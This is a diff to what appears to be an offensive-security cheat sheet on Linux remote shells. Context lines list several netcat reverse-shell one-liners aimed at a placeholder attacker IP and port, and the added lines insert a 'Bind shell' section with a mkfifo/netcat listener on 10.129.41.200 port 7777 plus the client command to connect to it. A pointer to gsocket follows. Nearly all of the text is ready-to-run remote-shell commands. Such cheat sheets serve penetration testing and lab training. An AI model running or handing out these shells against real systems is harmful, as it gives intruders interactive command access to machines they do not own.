@@ -138,7 +138,12 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp
 nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
+**Bind shell:**
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f  # Server - Binding a Bash shell to the TCP session
 
+nc -nv 10.129.41.200 7777 # Client - Connecting to bind shell on target
+```
 ## gsocket
 
 Check it in [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
